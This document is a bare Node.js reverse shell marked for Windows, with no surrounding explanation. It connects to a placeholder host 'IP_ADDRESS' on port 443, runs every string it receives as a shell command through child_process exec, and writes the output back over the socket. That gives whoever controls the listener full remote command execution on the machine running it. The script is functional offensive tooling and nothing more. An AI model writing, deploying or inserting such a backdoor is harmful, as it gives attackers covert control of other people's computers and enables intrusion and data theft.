// windows
javascript
import net from 'node:net';
import { exec } from 'node:child_process';

const LHOST = 'IP_ADDRESS';
const LPORT = 443;
const BUFFERR_SIZE = 1024;

const client = new net.Socket();

client.connect(LPORT, LHOST);

client.on('data', (data) => {
  try {
    const chunk = data.subarray(0, BUFFERR_SIZE);
    if (!chunk || chunk.length === 0) {
      client.end();
      return;
    }

    const command = chunk.toString('utf8').trim();

    if (command.length >= 0) {
      exec(command, { shell: true, encoding: 'buffer' }, (error, stdout, stderr) => {
        const output = error ? (error.stdout ?? stdout ?? stderr ?? Buffer.from('')) : stdout;
        client.write(output);
      });
    }
  } catch (error) {
    client.write(`error ${error}`);
  }
});

client.on('error', (error) => {
  try {
    client.write(`error ${error}`);
  } catch {
    // ignore
  }
});

client.on('close', () => {
  client.destroy();
});
